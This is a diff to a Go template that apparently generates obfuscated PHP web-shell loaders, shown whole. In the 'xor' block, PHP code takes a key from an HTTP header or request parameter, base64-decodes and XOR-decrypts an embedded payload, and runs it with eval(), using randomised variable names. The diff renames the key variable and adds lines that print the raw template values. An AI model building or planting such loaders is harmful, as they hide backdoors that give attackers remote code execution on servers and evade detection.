@@ -80,19 +80,22 @@ eval(base64_decode('{{ .EncCode }}'))
 
 
 {{ define "xor" }}
-{{ if ne .EncHeader "" -}}
-  {{ index .V "encKey" }} = $_SERVER['HTTP_{{ .EncHeader }}'];
+{{ .XorHeader }}
+{{ .XorParam }}
+{{ .XorKey }}
+{{ if ne .XorHeader "" -}}
+  {{ index .V "xorKey" }} = $_SERVER['HTTP_{{ .XorHeader }}'];
 {{ else if eq .Method "GET" -}}
-  {{ index .V "encKey" }} = $_REQUEST['{{ .EncParam }}'];
+  {{ index .V "xorKey" }} = $_REQUEST['{{ .XorParam }}'];
 {{ else if eq .Method "POST" -}}
-  {{ index .V "encKey" }} = json_decode(file_get_contents('php://input'), true)['{{ .EncParam }}'];
+  {{ index .V "xorKey" }} = json_decode(file_get_contents('php://input'), true)['{{ .XorParam }}'];
 {{ end -}}
 
 {{ index .V "encSrc" }} = base64_decode('{{ .EncCode }}');
 {{ index .V "dSrc" }} = "";
 for({{ index .V "i" }}=0; {{ index .V "i" }}<strlen({{ index .V "encSrc" }}); ) {
-  for({{ index .V "ii" }}=0; ({{ index .V "ii" }}<strlen({{ index .V "encKey" }}) && {{ index .V "i" }}<strlen({{ index .V "encSrc" }})); {{ index .V "ii" }}++,{{ index .V "i" }}++) {
-    {{ index .V "dSrc" }} .= {{ index .V "encSrc" }}{ {{ index .V "i" }} } ^ {{ index .V "encKey" }}{ {{ index .V "ii" }} };
+  for({{ index .V "ii" }}=0; ({{ index .V "ii" }}<strlen({{ index .V "xorKey" }}) && {{ index .V "i" }}<strlen({{ index .V "encSrc" }})); {{ index .V "ii" }}++,{{ index .V "i" }}++) {
+    {{ index .V "dSrc" }} .= {{ index .V "encSrc" }}{ {{ index .V "i" }} } ^ {{ index .V "xorKey" }}{ {{ index .V "ii" }} };
   }
 }
 eval({{ index .V "dSrc" }});
